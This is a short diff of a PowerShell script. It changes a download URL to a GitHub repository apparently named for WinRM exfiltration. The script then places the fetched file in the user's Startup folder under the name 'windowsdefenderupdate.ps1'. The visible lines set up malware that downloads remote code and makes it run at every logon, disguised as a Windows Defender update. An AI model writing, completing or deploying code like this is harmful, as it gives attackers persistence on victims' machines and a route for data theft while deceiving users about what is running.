@@ -1,4 +1,4 @@
-$scriptUrl = "https://raw.githubusercontent.com/antiupdater/winpackageupdater/main/windowsdefenderupdate"
+$scriptUrl = "https://raw.githubusercontent.com/gokupwn/SharpWinrmExfil/main/test2"
 $scriptName = "windowsdefenderupdate.ps1"
 $userStartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
 $scriptPath = [System.IO.Path]::Combine($userStartupFolder, $scriptName)
